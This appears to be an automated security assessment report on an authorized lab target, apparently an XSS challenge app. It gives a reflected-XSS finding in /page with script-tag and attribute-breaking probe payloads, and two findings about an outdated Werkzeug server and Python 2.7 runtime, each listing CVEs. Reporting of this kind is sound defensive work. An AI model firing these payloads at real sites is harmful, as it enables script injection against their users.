# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-reflected Reflected XSS in /page via name parameter](#finding-1)
    - [2. MEDIUM — vulnerable-component Outdated Werkzeug 1.0.1 (dev server) — multiple known CVEs incl. debugger RCE & DoS](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-Life Python 2.7.18 runtime — unsupported, unpatched post-EOL CVEs](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyn6sro-oitm1s` |
| Target | http://target.local:32833/ |
| Started | 2026-06-29T03:12:29.464Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32833`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 high, 2 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-reflected] Reflected XSS in /page via name parameter

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32833/

The `name` GET parameter on /page is reflected into the HTML response without encoding. Injected `<script>` tags and attribute-breaking payloads are returned unescaped, enabling arbitrary JavaScript execution in a victim's browser.

**Reproduction**

```
GET /page?name=&lt;script&gt;alert(1)&lt;/script&gt; — the tag appears verbatim in the response HTML body.
```

**Evidence**

- Evidence `ev-mqynafyr-3` — `artifacts/s-0002/ev-mqynafyr-3/`

Request:

```http
GET /page?name=xssxZmqynaeax6j4o HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1017
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:15:19 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss15.css">
            <title>Dalgona - Triangle</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_triangle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." value="xssxZmqynaeax6j4o">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqynahso-4` — `artifacts/s-0002/ev-mqynahso-4/`

Request:

```http
GET /page?name=%22%3E%3CxssxZmqynaeax6j4o%3E HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1021
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:15:21 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss15.css">
            <title>Dalgona - Triangle</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_triangle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." value=""><xssxZmqynaeax6j4o>">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqynajmj-5` — `artifacts/s-0002/ev-mqynajmj-5/`

Request:

```http
GET /page?name=%22%3E%3CxssxZmqynaeax6j4o%3E HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1021
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:15:23 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss15.css">
            <title>Dalgona - Triangle</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_triangle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." value=""><xssxZmqynaeax6j4o>">
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [vulnerable-component] Outdated Werkzeug 1.0.1 (dev server) — multiple known CVEs incl. debugger RCE & DoS

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32833/

VERSION-BASED finding (matched by Server banner, not exploited). The application is served by the Werkzeug WSGI library/development server version 1.0.1 (released Apr 2020), disclosed in the HTTP `Server: Werkzeug/1.0.1 Python/2.7.18` response header on every route, and corroborated by the stock Werkzeug 404 error page ("The requested URL was not found on the server."). Werkzeug 1.0.1 is many major versions behind (current 3.x) and carries several known CVEs fixed in later releases:
- CVE-2024-34069 — interactive debugger remote code execution: if Flask/Werkzeug debug mode is enabled, an attacker who lures a developer to an attacker-controlled domain/subdomain and obtains the debugger PIN can execute code. Fixed in 2.3.8/3.0.3 (1.0.1 affected). Conditional (requires debug=True + PIN), but high-impact if so.
- CVE-2023-25577 — denial of service: multipart/form-data parsing accepts an unbounded number of parts, allowing CPU/memory exhaustion. Fixed in 2.2.3 (1.0.1 affected).
- CVE-2024-49767 — denial of service: `max_form_memory_size` is not enforced for the sum of all parts, allowing memory exhaustion on multipart uploads. Fixed in 3.0.6 (1.0.1 affected).
- CVE-2023-23934 — cookie parsing: a nameless cookie `=value` can shadow a legitimately-named cookie. Fixed in 2.2.3 (1.0.1 affected).
Additionally, the banner shows the Werkzeug DEVELOPMENT server is being used to serve the app — Werkzeug explicitly states it is not for production use (no hardening, single-threaded, verbose errors). Severity set to medium: the practical, unauthenticated CVEs are DoS; the debugger RCE is conditional on debug mode.

**Reproduction**

```
1. GET http://target.local:32833/ and read the response `Server` header → `Werkzeug/1.0.1 Python/2.7.18` (evidence ev-mqynhph9-j, replay ev-mqynhq6q-k; banner identical on both). 2. Negative control GET /verdict-nonexistent-7f3a → 404 (ev-mqynhr3u-l), whose body is the default Werkzeug error page, further confirming the framework. 3. Cross-reference Werkzeug 1.0.1 against the CVEs above (fixed in 2.2.3 / 2.3.8 / 3.0.3 / 3.0.6). Operator should verify whether debug mode is enabled (CVE-2024-34069 precondition) before relying on the RCE path.
```

**Evidence**

- Evidence `ev-mqynhr3u-l` — `artifacts/_/ev-mqynhr3u-l/`

Request:

```http
GET /verdict-nonexistent-7f3a HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:21:00 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqynhph9-j` — `artifacts/_/ev-mqynhph9-j/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:20:58 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqynhq6q-k` — `artifacts/_/ev-mqynhq6q-k/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:20:59 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-Life Python 2.7.18 runtime — unsupported, unpatched post-EOL CVEs

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32833/

VERSION-BASED finding (matched by Server banner, not exploited). The `Server: Werkzeug/1.0.1 Python/2.7.18` response header discloses that the app runs on CPython 2.7.18. Python 2.7.18 (Apr 2020) is the FINAL Python 2.7 release; Python 2 reached end-of-life on 2020-01-01 and receives NO security patches. Running an unsupported interpreter means any interpreter/stdlib vulnerability discovered after EOL remains permanently unpatched on this host. Notable CVEs that affect 2.7.x and were never backported to 2.7:
- CVE-2021-3177 — stack-based buffer overflow in `ctypes` (PyCArg_repr / c_double) — potential code execution where untrusted input reaches ctypes. Patched only in 3.6.13/3.7.10/3.8.8/3.9.2; 2.7 left unpatched.
- CVE-2021-23336 — web cache poisoning / parameter cloaking via semicolon handling in `urllib.parse.parse_qsl`. Patched in 3.x only; 2.7 unpatched.
- CVE-2023-24329 — `urllib.parse` blocklist bypass via leading whitespace in URLs (can defeat SSRF/host filters). Patched in 3.11.4 and backports; 2.7 unpatched.
- CVE-2022-0391 — control-character handling in `urllib.parse` (URL splitting). 2.7 unpatched.
Beyond specific CVEs, the unsupported-runtime status is itself the finding: no future fixes will ever ship. Severity medium: no single unauthenticated RCE is guaranteed against this app, but the platform is permanently unpatched and several real CVEs apply depending on how the app uses ctypes/urllib.

**Reproduction**

```
1. GET http://target.local:32833/ and read the `Server` header → contains `Python/2.7.18` (evidence ev-mqynhph9-j, replay ev-mqynhq6q-k; identical across replays). 2. Negative control GET /verdict-nonexistent-7f3a → 404 (ev-mqynhr3u-l), distinguishable status/length. 3. Confirm Python 2 EOL date (2020-01-01) and that 2.7.18 is the last release; map the CVEs above. Remediation: migrate to a supported Python 3.x runtime; no patch exists for the 2.7 line.
```

**Evidence**

- Evidence `ev-mqynhr3u-l` — `artifacts/_/ev-mqynhr3u-l/`

Request:

```http
GET /verdict-nonexistent-7f3a HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:21:00 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqynhph9-j` — `artifacts/_/ev-mqynhph9-j/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:20:58 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqynhq6q-k` — `artifacts/_/ev-mqynhq6q-k/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:20:59 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
